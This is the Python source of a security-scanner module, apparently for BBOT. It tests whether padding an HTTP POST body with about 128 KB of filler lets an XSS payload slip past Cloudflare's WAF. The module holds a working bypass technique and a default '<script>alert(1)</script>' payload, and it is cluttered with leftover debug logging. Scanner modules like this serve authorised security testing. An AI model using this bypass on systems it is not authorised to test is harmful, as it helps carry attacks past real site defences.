from bbot.modules.base import BaseModule
from bbot.core.config.models import BaseModuleConfig, Field


class nowafpls(BaseModule):
    watched_events = ["URL"]
    produced_events = ["FINDING"]
    flags = ["active", "invasive", "web-heavy"]
    meta = {
        "description": "Detect Cloudflare WAF bypasses via HTTP body padding (nowafpls technique)",
        "created_date": "2026-07-14",
        "author": "@liquidsec",
    }

    class Config(BaseModuleConfig):
        padding_size: int = Field(
            131072,
            description="Size in bytes of the padding injected before the malicious payload",
        )
        payload: str = Field(
            "<script>alert(1)</script>",
            description="Malicious payload expected to trigger the WAF",
        )

    per_host_only = True
    in_scope_only = True

    async def filter_event(self, event):
        # TEMP DEBUG
        self.critical(
            f"filter_event url={event.url} tags={sorted(event.tags)} "
            f"resolved_hosts={sorted(str(h) for h in event.resolved_hosts)} "
            f"host_metadata_keys={list(event.host_metadata.keys()) if hasattr(event, 'host_metadata') else '<none>'}"
        )
        if "cloudflare" not in event.tags:
            # TEMP DEBUG
            self.critical(f"filter_event REJECT (no cloudflare tag) url={event.url}")
            return False, "target is not tagged as Cloudflare"
        # TEMP DEBUG
        self.critical(f"filter_event ACCEPT url={event.url}")
        return True

    async def handle_event(self, event):
        url = event.url
        # TEMP DEBUG
        self.critical(f"handle_event ENTER url={url}")
        payload = self.config.get("payload")
        padding_size = int(self.config.get("padding_size"))
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        encoded_payload = self.helpers.quote(payload)

        unpadded_body = f"q={encoded_payload}"
        # TEMP DEBUG
        self.critical(f"handle_event -> sending UNPADDED POST url={url} body_len={len(unpadded_body)}")
        unpadded = await self.helpers.request(
            url, method="POST", data=unpadded_body, headers=headers, allow_redirects=False
        )
        # TEMP DEBUG
        self.critical(
            f"handle_event <- UNPADDED response url={url} "
            f"status={getattr(unpadded, 'status_code', None)} "
            f"cf_mitigated={('cf-mitigated' in unpadded.headers) if unpadded is not None else None} "
            f"body_snippet={(unpadded.text or '')[:120] if unpadded is not None else None!r} "
            f"is_cf_block={self._is_cf_block(unpadded)}"
        )
        if not self._is_cf_block(unpadded):
            # TEMP DEBUG
            self.critical(f"handle_event EXIT (unpadded not blocked, nothing to bypass) url={url}")
            self.debug(f"Unpadded payload was not blocked at {url}, nothing to bypass")
            return

        padded_body = f"padding={'A' * padding_size}&q={encoded_payload}"
        # TEMP DEBUG
        self.critical(f"handle_event -> sending PADDED POST url={url} body_len={len(padded_body)}")
        padded = await self.helpers.request(
            url, method="POST", data=padded_body, headers=headers, allow_redirects=False
        )
        # TEMP DEBUG
        self.critical(
            f"handle_event <- PADDED response url={url} "
            f"status={getattr(padded, 'status_code', None)} "
            f"cf_mitigated={('cf-mitigated' in padded.headers) if padded is not None else None} "
            f"body_snippet={(padded.text or '')[:120] if padded is not None else None!r} "
            f"is_cf_block={self._is_cf_block(padded)}"
        )
        if self._is_cf_block(padded):
            # TEMP DEBUG
            self.critical(f"handle_event EXIT (padded still blocked, bypass failed) url={url}")
            self.debug(f"Padded payload still blocked at {url}, bypass failed")
            return

        # TEMP DEBUG
        self.critical(
            f"handle_event BYPASS CONFIRMED url={url} "
            f"unpadded_status={unpadded.status_code} padded_status={padded.status_code}"
        )
        await self.emit_event(
            {
                "host": str(event.host),
                "url": url,
                "severity": "LOW",
                "confidence": "CONFIRMED",
                "name": "WAF Bypass via Body Padding",
                "description": (
                    f"Cloudflare WAF bypassable via nowafpls-style body padding. "
                    f"Unpadded POST containing the malicious payload was blocked "
                    f"(status {unpadded.status_code}); the same payload preceded by "
                    f"{padding_size} bytes of padding reached the application "
                    f"(status {padded.status_code})."
                ),
            },
            "FINDING",
            parent=event,
            context=f"{{module}} bypassed the Cloudflare WAF at {url} via {padding_size}-byte body padding",
        )

    @staticmethod
    def _is_cf_block(response):
        if response is None:
            return False
        if "cf-mitigated" in response.headers:
            return True
        if response.status_code == 403:
            body = response.text or ""
            if "Attention Required" in body or "Cloudflare Ray ID" in body:
                return True
        return False
